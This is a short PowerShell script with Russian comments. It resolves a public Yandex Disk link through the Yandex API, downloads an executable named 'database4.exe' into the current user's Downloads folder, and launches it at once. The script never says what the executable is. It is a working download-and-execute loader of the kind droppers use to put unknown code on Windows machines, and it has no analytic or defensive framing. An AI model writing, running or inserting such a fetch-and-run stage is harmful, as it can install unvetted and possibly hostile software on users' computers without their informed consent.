# Публичная ссылка на файл на Яндекс.Диске
$publicUrl = "https://disk.yandex.ru/d/aKmufr351xu1hw"

# Получаем прямую ссылку на скачивание через API
$apiUrl = "https://cloud-api.yandex.net/v1/disk/public/resources/download?public_key=$([uri]::EscapeDataString($publicUrl))"

try {
    $response = Invoke-RestMethod -Uri $apiUrl -Method Get
    $downloadUrl = $response.href

    if (-not $downloadUrl) {
        throw "Прямая ссылка не получена"
    }

    # Путь к папке "Загрузки" текущего пользователя
    $downloadsPath = Join-Path -Path $env:USERPROFILE -ChildPath "Downloads"

    # Если папка "Downloads" не существует, создаём её
    if (-not (Test-Path -Path $downloadsPath)) {
        New-Item -Path $downloadsPath -ItemType Directory | Out-Null
    }

    # Полный путь для сохранения файла
    $savePath = Join-Path -Path $downloadsPath -ChildPath "database4.exe"

    Write-Host "`n[!] Скачиваю файл в $savePath ..." -ForegroundColor Cyan
    Invoke-WebRequest -Uri $downloadUrl -OutFile $savePath

    Write-Host "[+] Файл сохранён: $savePath"
    Write-Host "[*] Запускаю файл..." -ForegroundColor Green

    Start-Process -FilePath $savePath -Wait
}
catch {
    Write-Error "Ошибка при скачивании или запуске: $_"
}
